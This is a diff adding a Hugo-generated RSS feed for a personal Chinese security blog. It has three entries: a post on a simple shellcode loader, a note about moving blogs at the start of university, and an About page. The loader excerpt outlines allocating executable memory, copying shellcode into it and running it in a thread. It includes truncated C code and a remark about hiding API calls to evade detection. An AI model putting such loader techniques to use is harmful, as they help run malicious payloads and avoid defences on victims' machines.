@@ -1,0 +1,46 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Muxue Blog</title>
+    <link>https://secxue.github.io/</link>
+    <description>Recent content on Muxue Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 04 Oct 2021 13:40:53 +0800</lastBuildDate><atom:link href="https://secxue.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Simple Shellcode Loader</title>
+      <link>https://secxue.github.io/posts/simple-shellcode-loader/</link>
+      <pubDate>Mon, 04 Oct 2021 13:40:53 +0800</pubDate>
+      
+      <guid>https://secxue.github.io/posts/simple-shellcode-loader/</guid>
+      <description>前言 之前的东西，加了个功能又学到了新东西，练下代码；
+这一篇都非常简单！！！这垃圾代码再改改，硬编码下字符串、隐藏下WinAPI等，肯定效果很更好点。
+开冲 就是简单的三部曲
+ 申请内存 写入内存 然后加载  VirtualAlloc() or VirtualAllocEx(); CopyMemory() or WriteMemory(); CreateThread() or (*(void (*)()) shellcode)();; 还有很多类似的这种..
+ExecBin 这个就比较简单了，
+1. 从文件中读取 2. 然后拷贝进内存 3. 创建线程加载 void ExecBin(char* file_name) { DWORD two; LARGE_INTEGER fileSize; HANDLE hThread; DWORD dwThreadId; char* filename = file_name; HANDLE MyFile = CreateFileA(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); GetFileSizeEx(MyFile, &amp;amp;fileSize); char buf[6000]; ZeroMemory(&amp;amp;buf, sizeof(buf)); printf(&amp;#34;Size : %d \n&amp;#34;, fileSize.LowPart); char *xue_buf = (char*)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); ReadFile(MyFile, buf, fileSize.</description>
+    </item>
+    
+    <item>
+      <title>new</title>
+      <link>https://secxue.github.io/posts/new/</link>
+      <pubDate>Fri, 01 Oct 2021 13:24:37 +0800</pubDate>
+      
+      <guid>https://secxue.github.io/posts/new/</guid>
+      <description>来到大学一个月，从入学到中秋期间才结束军训，上了一周课到了国庆.. 一切都是那么的不熟悉
+趁着到了国庆有时间，博客从hexo换到了hugo；又是浪费了一堆时间
+然后国庆期间给博客除除草</description>
+    </item>
+    
+    <item>
+      <title>About</title>
+      <link>https://secxue.github.io/about/</link>
+      <pubDate>Fri, 01 Oct 2021 13:23:13 +0800</pubDate>
+      
+      <guid>https://secxue.github.io/about/</guid>
+      <description>ID: Muxue
+简介: 安全混子</description>
+    </item>
+    
+  </channel>
+</rss>
